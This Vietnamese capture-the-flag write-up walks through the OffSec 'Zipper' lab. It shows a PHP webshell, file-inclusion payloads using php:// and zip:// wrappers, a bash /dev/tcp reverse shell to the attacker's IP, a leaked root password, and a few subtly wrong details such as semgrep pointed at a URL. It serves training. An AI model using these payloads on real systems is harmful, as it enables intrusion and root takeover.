# Offsec Zipper Lab Writeup: File Inclusion và Privilege Escalation

**Link lab**: [Offsec Practice Lab](https://portal.offsec.com/labs/practice)  
**IP**: 192.168.57.229  
**Tên máy**: Zipper

## Mục tiêu

Khai thác lỗ hổng trên dịch vụ web để lấy shell ban đầu và leo quyền lên root thông qua phân tích cronjob.

## Bước 1: Enumeration

### Quét dịch vụ bằng Nmap

Chạy lệnh `nmap` để xác định các port mở và dịch vụ trên host:

```bash
nmap -sC -sV -p- 192.168.57.229
```

**Kết quả**:

- **Port 22**: SSH (OpenSSH).
- **Port 80**: HTTP (Apache/2.4.41 trên Ubuntu, chạy PHP).

### Phân tích dịch vụ web (Port 80)

Sử dụng `whatweb` để thu thập thông tin về web server:

```bash
whatweb http://192.168.57.229
```

**Kết quả**:

- Web server: Apache/2.4.41 (Ubuntu), PHP.
- Chức năng: Upload file, nén file thành `.zip`, và tải file `.zip`.

### Kiểm tra lỗ hổng File Inclusion

Dựa trên [cheatsheet File Inclusion](https://www.hackthebox.com/files/cheatsheet-file-inclusion.pdf), tôi nhận thấy PHP hỗ trợ **Stream Wrappers** như `php://`, `zip://`, `data://`, cho phép truy cập tài nguyên như file thông thường. Tôi thử khai thác lỗ hổng **Local File Inclusion (LFI)** bằng wrapper `php://filter`:

```bash
curl "http://192.168.57.229/index.php?file=php://filter/read=convert.base64-encode/resource=upload"
```

**Kết quả**:

- Đọc được nội dung các file trong hệ thống (như `/var/www/html/upload`, `/var/www/html/index.php`) dưới dạng mã hóa base64.
- Giải mã base64 để phân tích source code.

### Phân tích source code

- Source code của `index.php` cho thấy chức năng đọc file không kiểm tra định dạng file upload, chỉ kiểm tra tham số `file` bằng `GET`.
- Sử dụng `semgrep` để quét lỗ hổng:

```bash
semgrep --config=p/r2c-security-audit http://192.168.57.229
```

- Kết quả: Phát hiện lỗ hổng **Path Traversal** trong tham số `file` của `index.php`, cho phép truy cập các file ngoài thư mục web root.

## Bước 2: Khai thác LFI để lấy shell

### Upload webshell

Tận dụng chức năng upload không giới hạn định dạng, tôi tạo một webshell đơn giản `shell.php`:

```php
<?php system($_GET['cmd']); ?>
```

Upload file qua giao diện web:

```bash
curl -F "file=@shell.php" http://192.168.57.229/upload
```

**Kết quả**: File được upload và lưu trong file zip `upload_1751557612.zip` tại thư mục `/var/www/html/uploads`.

### Truy cập webshell qua zip://

Sử dụng wrapper `zip://` để truy cập `shell.php` trong file zip:

```bash
curl "http://192.168.57.229/index.php?file=zip://uploads/upload_1751557612.zip%23shell&cmd=id"
```

**Kết quả**: Lệnh `id` thực thi thành công, xác nhận webshell hoạt động.

### Tạo reverse shell

1. Mở listener trên máy Kali (IP: 192.168.49.58):

```bash
nc -lvnp 1234
```

2. Gửi yêu cầu HTTP để tạo reverse shell:

```bash
curl "http://192.168.57.229/index.php?file=zip://uploads/upload_1751557612.zip%23shell&cmd=bash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.49.58%2f1234%200%3e%261'"
```

**Kết quả**: Nhận được reverse shell với user `www-data` và lấy được flag đầu tiên (`local.txt`).

## Bước 3: Privilege Escalation

### Kiểm tra cronjob

Kiểm tra các cronjob để tìm vector leo quyền:

```bash
cat /etc/crontab
cat /etc/cron.*
```

**Kết quả**:

- Phát hiện script `/opt/backup.sh` chạy với quyền root mỗi phút:

```bash
* * * * * root bash /opt/backup.sh
```

Nội dung script:

```bash
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

- Quan sát: Script đọc password từ `/root/secret` (không có quyền truy cập) và sử dụng trong lệnh `7za` với tùy chọn `-p` (password in plaintext).

### Theo dõi tiến trình bằng `pspy`

1. Tải công cụ `pspy32` từ máy Kali (IP: 192.168.49.58):

```bash
# Trên máy Kali
python3 -m http.server 8000
```

2. Tải `pspy32` về máy mục tiêu:

```bash
wget http://192.168.49.58:8000/pspy32 -O /tmp/pspy32
chmod +x /tmp/pspy32
```

3. Chạy `pspy32` để giám sát tiến trình:

```bash
/tmp/pspy32
```

**Kết quả**: Bắt được lệnh `7za` với password in plaintext:

```
2025/07/05 00:42:01 CMD: UID=0 PID=2677 | /usr/lib/p7zip/7za a /opt/backups/backup.zip -pWildCardsGoingWild -tzip @enox.zip enox.zip
```

- Password: `WildCardsGoingWild`.

### Đăng nhập root

Sử dụng password để đăng nhập SSH với user `root`:

```bash
ssh root@192.168.57.229 -p 22
```

**Kết quả**: Đăng nhập thành công và lấy được flag root.

## Bài học rút ra

1. **LFI và Stream Wrappers**: Kỹ thuật sử dụng `php://filter` và `zip://` rất mạnh mẽ để khai thác lỗ hổng file inclusion.
2. **Kiểm tra source code**: Phân tích source code và quét bằng `semgrep` giúp phát hiện các misconfiguration quan trọng.
3. **Giám sát cronjob**: Công cụ `pspy` là lựa chọn tuyệt vời để theo dõi tiến trình và lấy thông tin nhạy cảm như password.
4. **Upload không giới hạn**: Các chức năng upload không kiểm tra định dạng là điểm yếu phổ biến, dễ bị khai thác để upload webshell.